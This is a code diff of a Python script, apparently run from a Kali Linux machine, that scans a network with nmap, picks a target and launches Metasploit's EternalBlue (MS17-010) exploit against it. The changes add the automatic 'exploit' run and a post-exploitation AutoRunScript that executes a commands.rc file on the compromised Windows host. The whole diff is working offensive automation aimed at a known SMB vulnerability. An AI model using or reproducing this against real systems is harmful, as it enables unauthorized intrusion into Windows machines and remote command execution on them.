@@ -1,6 +1,7 @@
 import subprocess
 import ipaddress
 import os
+import sys
 DIR = "/home/kali/Desktop/temporarily_files"
 
 
@@ -31,14 +32,20 @@ def nmapScan(ip):
        	   ip_new = os.popen("cat %s/nmap_scan | grep 'Ports: 53'| cut -d ' ' -f 2 | sort -u"%DIR ).read()
            return ip_new
        elif (confirmT == "no" or confirmT == "n" or confirmT == "N"):
-           ip_new = input("Enter manually your target's IP:\n")
+           subprocess.call(["clear"])
+           subprocess.call(["cat","%s/nmap_scan"%DIR])
+           ip_new = input("\n\nEnter manually your target's IP:\n")
            if (loop(ip_new)):
                return ip_new
        else:
            continue
 
 def msfconsole(target, host):
-	subprocess.call(["msfconsole", "-q", "-x", "use exploit/windows/smb/ms17_010_eternalblue; set RHOST %s; set LHOST %s;"])
+	global DIR
+	subprocess.call(["clear"])
+	print("Starting attack ...to %s"%target)
+	subprocess.call(["msfconsole", "-q", "-x", "use exploit/windows/smb/ms17_010_eternalblue; set RHOST %s; set LHOST %s; set AutoRunScript multi_console_command -r %s/commands.rc; exploit;"%(target,host,DIR)])
+	sys.exit()
 
 if __name__ == '__main__':
 
@@ -63,5 +70,4 @@ if __name__ == '__main__':
         ipt = input("\n\n\nEnter the name of the current Hots-Only network IP. Example: 0.0.0.0\n")
         if(loop(ipt)):
             startup = nmapScan(network)
-            msfconsole(startup, ipt)
-            
+            msfconsole(startup, ipt)    
